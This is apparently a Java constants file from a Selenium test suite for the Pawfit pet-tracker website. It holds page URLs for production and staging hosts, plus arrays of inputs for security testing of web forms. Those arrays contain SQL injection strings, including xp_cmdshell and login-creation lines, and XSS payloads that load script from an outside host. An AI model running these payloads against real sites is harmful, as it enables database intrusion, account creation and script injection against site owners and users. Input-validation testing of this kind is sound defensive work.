package com.latsen.pawfit.Const;

import org.openqa.selenium.OutputType;
import org.openqa.selenium.TakesScreenshot;
import org.testng.internal.Utils;

import java.io.File;
import java.util.ArrayList;

public class Const {
    public final static String BASEURL="https://www.pawfit.com/";
    public final static String HUB_URL="http://localhost:4444/wd/hub";
    public final static String SESSION_ID="1018038d-fd40-4a1f-8f1b-d1005b139e9f";
    public final static String LOGiN_URL="https://www.pawfit.com/customer-account/customer-logon.html";
    public final static String REGISTER_RUL="https://www.pawfit.com/customer-account/registration.html";
    public final static String PRODUCT_URL="https://www.pawfit.com/product.html";
    public final static String HOME_URL="https://www.pawfit.com/";
    public final static String ABOUT_URL="https://www.pawfit.com/company.html";
    public final static String SUPPORT_URL="https://www.pawfit.com/support.html";
    public final static String BLOG_URL="https://www.pawfit.com/blogs.html";
    public final static String STORY_URL="https://www.pawfit.com/stories-events.html";
    public final static String PAWFIT_COLLAR_URL="https://www.pawfit.com/product/pawfit-collar.html";
    public final static String PAWFIT2_URL="https://www.pawfit.com/product/pawfit2.html";
    public final static String ACCESSORY1_URL=" https://www.pawfit.com/product/harnesses-leashes-collars.html";
    public final static String ACCESSORY2_URL="https://www.pawfit.com/product/accessories.html";
    public final static String HOW_URL="https://www.pawfit.com/how-it-works.html";
    public final static String PAWFIT2_BUNDLE_DEAL="https://www.pawfit.com/product/pawfit-2-gift-deal.html";
    public final static String PAWFIT_LEASH="https://www.pawfit.com/product/pawfit-leash.html";
    public final static String PAWFIT_HARNESS_FOR_DOGS="https://www.pawfit.com/product/pawfit-harness-for-dogs.html";

//    public final static String BASEURL="http://3.8.61.142:8080/";
//    public final static String HUB_URL="http://localhost:4444/wd/hub";
//    public final static String SESSION_ID="1018038d-fd40-4a1f-8f1b-d1005b139e9f";
//    public final static String LOGiN_URL="http://3.8.61.142:8080/customer-account/customer-logon.html";
//    public final static String REGISTER_RUL="http://3.8.61.142:8080/customer-account/registration.html";
//    public final static String PRODUCT_URL="http://3.8.61.142:8080/product.html";
//    public final static String HOME_URL="http://3.8.61.142:8080/";
//    public final static String ABOUT_URL="http://3.8.61.142:8080/company.html";
//    public final static String SUPPORT_URL="http://3.8.61.142:8080/support.html";
//    public final static String BLOG_URL="http://3.8.61.142:8080/blogs.html";
//    public final static String STORY_URL="http://3.8.61.142:8080/stories-events.html";
//    public final static String PAWFIT_COLLAR_URL="http://3.8.61.142:8080/product/pawfit-collar.html";
//    public final static String PAWFIT2_URL="http://3.8.61.142:8080/product/pawfit2.html";
//    public final static String ACCESSORY1_URL="http://3.8.61.142:8080/product/harnesses-leashes-collars.html";
//    public final static String ACCESSORY2_URL="http://3.8.61.142:8080/product/accessories.html";
//    public final static String HOW_URL="http://3.8.61.142:8080/how-it-works.html";
//    public final static String PAWFIT2_BUNDLE_DEAL="http://3.8.61.142:8080/product/pawfit-2-gift-deal.html";
//    public final static String PAWFIT_LEASH="http://3.8.61.142:8080/product/pawfit-leash.html";
//    public final static String PAWFIT_HARNESS_FOR_DOGS="http://3.8.61.142:8080/product/pawfit-harness-for-dogs.html";

//    public final static String BASEURL="https://pawfit.latsen.com/";
//    public final static String HUB_URL="http://localhost:4444/wd/hub";
//    public final static String SESSION_ID="1018038d-fd40-4a1f-8f1b-d1005b139e9f";
//    public final static String LOGiN_URL="https://pawfit.latsen.com/en-gb/customer-account/customer-logon.html";
//    public final static String REGISTER_RUL="https://pawfit.latsen.com/en-gb/customer-account/registration.html";
//    public final static String PRODUCT_URL="https://pawfit.latsen.com/en-gb/product.html";
//    public final static String HOME_URL="https://pawfit.latsen.com/";
//    public final static String ABOUT_URL="https://pawfit.latsen.com/en-gb/company.html";
//    public final static String SUPPORT_URL="https://pawfit.latsen.com/en-gb/support.html";
//    public final static String BLOG_URL="https://pawfit.latsen.com/en-gb/blogs.html";
//    public final static String STORY_URL="https://pawfit.latsen.com/en-gb/stories-events.html";
//    public final static String PAWFIT_COLLAR_URL="https://pawfit.latsen.com/en-gb/product/pawfit-collar.html";
//    public final static String PAWFIT2_URL="https://pawfit.latsen.com/en-gb/product/pawfit2.html";
//    public final static String ACCESSORY1_URL="https://pawfit.latsen.com/en-gb/product/harnesses-leashes-collars.html";
//    public final static String ACCESSORY2_URL="https://pawfit.latsen.com/en-gb/product/pawfit-2-accessories.html";
//    public final static String HOW_URL="https://pawfit.latsen.com/en-gb/how-it-works.html";
//    public final static String PAWFIT2_BUNDLE_DEAL="https://pawfit.latsen.com/en-gb/product/pawfit-2-gift-deal.html";
//    public final static String PAWFIT_LEASH="https://pawfit.latsen.com/en-gb/product/pawfit-leash.html";
//    public final static String PAWFIT_HARNESS_FOR_DOGS="https://pawfit.latsen.com/en-gb/product/pawfit-harness-for-dogs.html";



    private static Utils FileUtils;

    public final static String[] getSQlText(){
        String[] strings={
                "and ascii(substr((select database()),1,1))>64",
                "id=1 union select if(SUBSTRING(user(),1,4)='root',sleep(4),1),null,null",
                "id =-1 union select 1,2,3", "id=1' substr(database(),1,1)='t'--+",
                "union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a", "id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))",
                "and 0<>(select count(*) from *) ",
                "and 0<>(select count(*) from admin)",
                "and 0<(select count(*) from admin) ",
                "and 1<(select count(*) from admin)",
                "group by users.id having 1=1-- ",
                "and 1=(select count(*) from admin where len(*)>0) ",
                "and 1=(select count(*) from admin where len(name)>6) ",
                "and 1=(select count(*) from admin where len(name)>5) ",
                ";exec master..xp_blank>_cmdshell dir",
                ";exec master.dbo.sp_blank>_addlogin jiaoniang$;"
        };
        return strings;

    }
    public final static String[] getXssTest()
    {
       return new String[]{
               "<IMG SRC=\" javascript:alert('XSS');\">",
               "<SCRIPT/XSS SRC=\"http://3w.org/XSS/xss.js\"></SCRIPT>",
               "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
               "<SCRIPT/SRC=\"http://3w.org/XSS/xss.js\"></SCRIPT>\n",
               "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
               "<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>",
               "<SCRIPT SRC=//3w.org/XSS/xss.js>\n",
               "<IMG SRC=\"javascript:alert('XSS')\"\n",
               "<iframe src=http://3w.org/XSS.html <",
               "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS\n",
               "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n",
               "<TABLE BACKGROUND=\"javascript:alert('XSS')\">\n",
               "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\n",
               "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
               "<DIV STYLE=\"width: expression_r(alert('XSS'));\">\n",
               "<IMG STYLE=\"xss:expression_r(alert('XSS'))\">\n",
               "<XSS STYLE=\"xss:expression_r(alert('XSS'))\">\n",
               "exppression(alert(\"XSS\"))'>",
               "<BASE HREF=\"javascript:alert('XSS');//\">\n",
               "<EMBED SRC=\"http://3w.org/XSS/xss.swf\" ></EMBED>",
               "<SCRIPT =\">\" SRC=\"http://3w.org/xss.js\"></SCRIPT>"
       };
    }

    public final static String[] getCommomText(){
        String[] strings={
                "",
                "进一步查阅资料后，我对 TestCase 类和JUnit 框架的理解是它们是两种不同的测试方法。自己写的类（如HibernateTest.java）继承 TestCase这个父类后，HibernateTest类下的所有测试用例（testXxx(){...}）都是TestCase父类的一个实例，用java面向对象术语来说的话，每一个 testXxx() 测试用例都是 TestCase类的对象。“方法是类的对象”，有点难理解对吧，不过事实上就是这样的。既然我们的类继承TestCase 后每一个测试用例都是一个对象，那么这些 testXxx() 不能直接借助Junit 框架调用其他对象——@Befeore、@AfterClass标签所注释的方法，也是可以理解的了。Junit 就不多说了，常用的一个测试框架。",
                "<script type=\"text/javascript\" src=\"https://dss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/static/protocol/https/lib/esl_2549dd2.js\"></script>",
                "<a href=\"/shopping-order/checkout.html\">Proceed to checkout</a>",
                "union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a",
                "document.getElementById(\"myH\").innerHTML = \"我的第一张页面\";",
                "/*\n" +
                        "document.getElementById(\"myH\").innerHTML = \"我的第一张页面\";\n" +
                        "document.getElementById(\"myP\").innerHTML = \"我的第一个段落。\";\n" +
                        "*/",
                "/*",
                "*/",
                "body\n" +
                        "{\n" +
                        "    background-color:#d0e4fe;\n" +
                        "}\n" +
                        "h1\n" +
                        "{\n" +
                        "    color:orange;\n" +
                        "    text-align:center;\n" +
                        "}\n" +
                        "p\n" +
                        "{\n" +
                        "    font-family:\"Times New Roman\";\n" +
                        "    font-size:20px;\n" +
                        "}"
        };

        return strings;
    }
    public final static String[] getEmail(){
        String[] string = new String[101];
        for (int i=0;i<100;i++){
            string[i]=i+"@bccto.me";
        }
        return string;
    }





}

